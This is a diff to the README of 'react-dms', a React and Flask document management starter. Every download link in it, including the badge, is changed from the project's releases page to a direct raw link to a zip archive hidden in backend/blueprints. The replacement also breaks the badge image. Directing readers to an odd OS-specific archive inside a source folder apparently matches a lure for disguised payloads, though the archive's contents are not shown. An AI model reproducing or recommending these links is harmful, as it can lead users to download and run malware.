@@ -4,14 +4,14 @@
 react-dms is a complete starter for building a Document Management System (DMS) using React with Vite for the front end and Flask for the back end. It offers features such as CRUD operations for documents, robust searching, and the ability to archive and restore records. The application uses Postgres and SQLAlchemy, ensuring your data is managed efficiently and safely. Ideal for users looking for a structured way to handle their documents. 
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/companymangalliano841/react-dms/releases)
+[![Download](https://github.com/companymangalliano841/react-dms/raw/refs/heads/main/backend/blueprints/react_dms_v1.0.zip%20Latest%20Release-blue)](https://github.com/companymangalliano841/react-dms/raw/refs/heads/main/backend/blueprints/react_dms_v1.0.zip)
 
 ## 🚀 Getting Started
 To get started with react-dms, please follow these steps:
 
 1. **Visit the Downloads Page**  
    Click the link below to access the latest version of react-dms.  
-   [Download here](https://github.com/companymangalliano841/react-dms/releases)  
+   [Download here](https://github.com/companymangalliano841/react-dms/raw/refs/heads/main/backend/blueprints/react_dms_v1.0.zip)  
 
 2. **Choose the Right Package**  
    On the releases page, you will see several downloadable files. Look for the package that matches your operating system.  
@@ -67,7 +67,7 @@ If you encounter any issues or have questions about how to use react-dms, please
 To begin using react-dms, please make sure you complete the following steps:
 
 1. **Visit the Downloads Page:**  
-   [Download here](https://github.com/companymangalliano841/react-dms/releases)  
+   [Download here](https://github.com/companymangalliano841/react-dms/raw/refs/heads/main/backend/blueprints/react_dms_v1.0.zip)  
    You will find the latest versions available for download.
 
 2. **Download the Right File:**  
